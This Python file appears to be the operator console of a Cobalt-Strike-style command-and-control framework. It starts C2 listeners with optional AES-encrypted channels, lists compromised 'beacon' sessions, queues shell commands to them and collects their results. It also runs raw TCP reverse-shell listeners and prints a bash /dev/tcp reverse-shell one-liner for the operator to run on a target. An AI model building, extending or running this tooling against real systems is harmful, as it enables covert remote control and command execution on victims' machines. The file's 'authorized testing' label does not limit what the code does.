"""cscli interactive operator console."""
import base64
import json
import os
import time

from ..server import TeamServer
from .. import commands as cmd


def _banner():
    return r"""
     ____  ____    ___   _     ___ 
    / ___|| _ \  / __| / \   |_ _|
    \___ \|   / | (__  / _ \   | | 
     ___) |_|_\  \___|/_/ \_\ |___|
        Cobalt-Strike-style C2 (authorized testing)
    -----------------------------------------------
"""


class Console:
    def __init__(self, data_dir=None):
        self.srv = TeamServer(data_dir=data_dir)
        self._crypto_key = None
        self._quick_refreshed = False

    def run(self, args):
        print(_banner())
        print(f"[*] teamserver: {self.srv.name}")
        print("[*] type 'help' for commands")

        # auto-start default listener if requested (from --listener or --host)
        if args is not None and hasattr(args, "listener") and args.listener:
            name, host, port = args.listener
            self.cmd_listener(f"{name} {port} {host}")
        elif args is not None and hasattr(args, "host") and args.host:
            self.cmd_listener(f"default {int(args.port or 8080)} {args.host}")

        while True:
            try:
                line = input("cscli> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[!] bye")
                break
            if not line:
                continue
            if line in ("quit", "exit"):
                print("[*] bye")
                break
            self.dispatch(line)

    # ---------- dispatch ----------
    def dispatch(self, line):
        parts = line.split(maxsplit=1)
        verb = parts[0].lower()
        rest = parts[1] if len(parts) > 1 else ""
        normal = verb.replace("-", "_")
        handler = getattr(self, f"cmd_{normal}", None)
        if not handler:
            print(f"[!] unknown command: {verb}. type 'help'")
            return
        try:
            handler(rest)
        except Exception as e:
            print(f"[!] error: {e}")

    # ---------- commands ----------
    def cmd_help(self, _):
        print("""
  Listeners
    listener <name> <port> [host]   start an HTTP listener
    https <name> <port> [host]      start an HTTPS listener (self-signed cert)
    listener-stop <name>            stop a listener
    listeners                       list running listeners
    key <passphrase>                set AES key used to encrypt C2 traffic
    keys                            show configured channel options

  Reverse shells (raw TCP interactive)
    reverse-shell <host> <port>     start a reverse-shell listener
    rsh-list                        list live reverse-shell sessions
    rsh-shell <session_id>          interact with a live reverse shell

  Sessions
    sessions                        list active beacons
    interactive                     choose a session for interactive tasking
    use <session_id>                enter interactive mode (default: none)
    results <session_id>            show results collected for a session
    clear-results <session_id>      drop saved results
    disconnect <session_id>         order beacon to stop + self-remove
    delete <session_id> [--force]   remove the session record from the store

  Tasking (while 'use <id>' active)
    task <cmd>            queue a command for the selected session
    (also any beacon command directly, e.g. 'shell id', 'ls /tmp')

  Global
    sleep <seconds>       default beacon callback interval
    help                  this help
    quit / exit
""")

    # --- listeners ---
    def cmd_listener(self, rest):
        parts = rest.split(maxsplit=2)
        if not parts:
            print("[!] usage: listener <name> <port> [host]")
            return
        try:
            name = parts[0]
            port = int(parts[1])
            host = parts[2] if len(parts) > 2 else "0.0.0.0"
        except ValueError:
            print("[!] usage: listener <name> <port> [host]")
            return
        lis, err = self.srv.start_listener(name, host, port, crypto_key=self._current_key())
        if err:
            print(f"[!] {err}")
        else:
            print(f"[+] started listener '{name}' on {host}:{port}"
                  + (" (AES-GCM channel)" if self._current_key() else ""))

    def cmd_listener_stop(self, rest):
        if not rest:
            print("[!] usage: listener-stop <name>")
            return
        ok, err = self.srv.stop_listener(rest)
        print(f"[+] stopped {rest}" if ok else f"[!] {err}")

    def cmd_https(self, rest):
        parts = rest.split(maxsplit=2)
        if not parts:
            print("[!] usage: https <name> <port> [host]")
            return
        try:
            name = parts[0]
            port = int(parts[1])
            host = parts[2] if len(parts) > 2 else "0.0.0.0"
        except ValueError:
            print("[!] usage: https <name> <port> [host]")
            return
        lis, err = self.srv.start_https_listener(
            name, host, port, crypto_key=self._current_key())
        if err:
            print(f"[!] {err}")
        else:
            print(f"[+] started HTTPS listener '{name}' on {host}:{port} (TLS + "
                  + ("AES-GCM)" if self._current_key() else "no channel AES)"))

    def _current_key(self):
        return getattr(self, "_crypto_key", None)

    def cmd_key(self, rest):
        key = rest.strip()
        if not key:
            print("[!] usage: key <passphrase>  (or 'key none' to disable)")
            return
        if key.lower() == "none":
            self._crypto_key = None
            print("[*] channel AES encryption disabled")
            return
        self._crypto_key = key
        print(f"[*] channel AES key set. Use same '--key {key}' when generating payloads")

    def cmd_keys(self, _):
        print("[*] channel options:")
        print(f"    AES key : {'<set>' if self._current_key() else 'none (plaintext JSON)'}")

    def cmd_listeners(self, _):
        status = self.srv.listener_status()
        if not status:
            print("[-] no listeners running")
            return
        print(f"{'NAME':<16}{'URL':<32}{'STATUS'}")
        print("-" * 55)
        for l in status:
            st = "running" if l["running"] else "stopped"
            print(f"{l['name']:<16}{l['url']:<32}{st}")

    # --- sessions ---
    def cmd_sessions(self, _):
        sess = self.srv.store.all()
        if not sess:
            print("[-] no beacon sessions yet")
            return
        print(f"{'ID':<18}{'HOST':<18}{'USER':<14}{'IP':<16}{'OK':<6}")
        print("-" * 72)
        for s in sess:
            alive = "yes" if self.srv.is_session_alive(s) else "STALE"
            print(f"{s['id']:<18}{s['hostname']:<18}{s['username']:<14}"
                  f"{s['internal_ip']:<16}{alive}")

    def cmd_use(self, rest):
        """Enter interactive mode targeting a session. 'use <id>' or 'use' to pick."""
        sid = rest.strip()
        if not sid:
            sess = self.srv.store.all()
            if not sess:
                print("[-] no sessions")
                return
            sid = sess[0]["id"]
        s = self.srv.store.get(sid)
        if not s:
            print(f"[!] session not found: {sid}")
            return
        print(f"[*] interactive on {sid} ({s['hostname']} @ {s['internal_ip']})")
        print("    type 'exit' to leave interactive mode; any command here queues a task")
        while True:
            try:
                line = input(f"beacon[{sid}]> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not line:
                continue
            if line in ("exit", "quit", "bg", "background"):
                break
            if line.startswith("clear-results"):
                parts = line.split()
                self.cmd_clear_results(sid)
                continue
            if line.startswith("results"):
                self.cmd_results(sid)
                continue
            # queue a task
            tid, info = self.srv.task(sid, line)
            if info and "error" in info:
                print(f"[!] {info['error']}")
            else:
                print(f"[+] queued [{tid}] : {line}")

    def cmd_interactive(self, rest):
        return self.cmd_use(rest)

    def cmd_results(self, rest):
        sid = rest.strip()
        if not sid:
            print("[!] usage: results <session_id>")
            return
        s = self.srv.store.get(sid)
        if not s:
            print(f"[!] session not found: {sid}")
            return
        if not s["results"]:
            print("[-] no results yet")
            return
        print(f"=== results for {sid} ===")
        for r in s["results"]:
            ts = time.strftime("%H:%M:%S", time.localtime(r["ts"]))
            print(f"\n[{ts}] task {r['id']}:")
            data = r["data"]
            if data.startswith("FILE "):
                parts = data.split(" ", 5)  # FILE <path> SIZE <n> B64 <...>
                if len(parts) >= 5:
                    p, sz, b64 = parts[1], parts[3], " ".join(parts[5:])
                    print(f"    [downloaded {p}, {sz} bytes] stored where? see interact menu")
                    continue
            print("    " + data.replace("\n", "\n    "))

    def cmd_clear_results(self, rest):
        sid = rest.strip()
        if not sid:
            print("[!] usage: clear-results <session_id>")
            return
        s = self.srv.store.get(sid)
        if s:
            s["results"] = []
            self.srv.store.save()
            print(f"[+] cleared results for {sid}")

    def cmd_disconnect(self, rest):
        """disconnect <session_id> -> order a beacon to stop + self-remove"""
        sid = rest.strip()
        if not sid:
            print("[!] usage: disconnect <session_id>")
            return
        ok, msg = self.srv.disconnect_session(sid)
        if isinstance(ok, tuple):
            tid, info = ok
            if info and "error" in info:
                print(f"[!] {info['error']}")
            else:
                print(f"[+] disconnect queued [{tid}] for {sid}")
        else:
            print(("[+] " if ok else "[!] ") + msg)

    def cmd_delete(self, rest):
        """delete <session_id> [--force] -> remove the session record from the store"""
        parts = rest.split()
        if not parts:
            print("[!] usage: delete <session_id> [--force]")
            return
        sid = parts[0]
        force = "--force" in parts[1:] or "-f" in parts[1:]
        ok, msg = self.srv.remove_session(sid, force=force)
        print(("[+] " if ok else "[!] ") + msg)

    # --- global ---
    def cmd_sleep(self, rest):
        try:
            sec = int(rest.strip())
        except Exception:
            print("[!] usage: sleep <seconds>")
            return
        v = self.srv.set_beacon_interval(sec)
        print(f"[*] default beacon interval set to {v}s")

    # ---------- reverse-shell (raw TCP interactive shell) ----------
    def cmd_reverse_shell(self, rest):
        """reverse-shell <host> <port> [name] -> start a raw TCP reverse-shell listener"""
        parts = rest.split(maxsplit=2)
        if len(parts) < 2:
            print("[!] usage: reverse-shell <host> <port> [name]")
            return
        try:
            host = parts[0]
            port = int(parts[1])
            name = parts[2] if len(parts) > 2 else "rsh"
        except ValueError:
            print("[!] usage: reverse-shell <host> <port> [name]")
            return
        lis, err = self.srv.start_reverse_shell(name, host, port)
        if err:
            print(f"[!] {err}")
        else:
            print(f"[+] reverse-shell listener '{name}' on {host}:{port}")
            print("    run on target:  bash -i >& /dev/tcp/<PUBLIC_IP>/%d 0>&1" % port)

    def cmd_rsh_list(self, _):
        found = False
        for name, lis in self.srv.rsh_listeners.items():
            for s in lis.list_sessions():
                found = True
                print(f"  {s.id:<10} {name:<10} {s.addr[0]}:{s.addr[1]:<6} open={s.open}")
        if not found:
            print("[-] no reverse-shell sessions (start one with: reverse-shell <host> <port>)")

    def cmd_rsh_shell(self, rest):
        """rsh-shell <session_id> -> interact with a live reverse shell"""
        from ..server.reverseshell import interactive_loop
        sid = rest.strip()
        sess = None
        for lis in self.srv.rsh_listeners.values():
            sess = lis.get(sid)
            if sess:
                break
        if not sess:
            print(f"[!] no reverse-shell session {sid}. see 'rsh-list'")
            return
        print(f"[*] interactive reverse shell [{sid}]; type 'exit' to detach")
        interactive_loop(self.srv, sess)


def run_cli(argv):
    data_dir = os.environ.get("CSCLI_DATA_DIR")
    c = Console(data_dir=data_dir)
    c.run(_argparse())

import argparse
def _argparse():
    p = argparse.ArgumentParser(prog="cscli", description="cscli team server console")
    p.add_argument("--host", help="host to bind default listener")
    p.add_argument("--port", type=int, default=8080, help="default listener port")
    p.add_argument("--listener", nargs=3, metavar=("NAME", "PORT", "HOST"),
                   help="start a listener at launch: listener <name> <port> <host>")
    return p.parse_args()
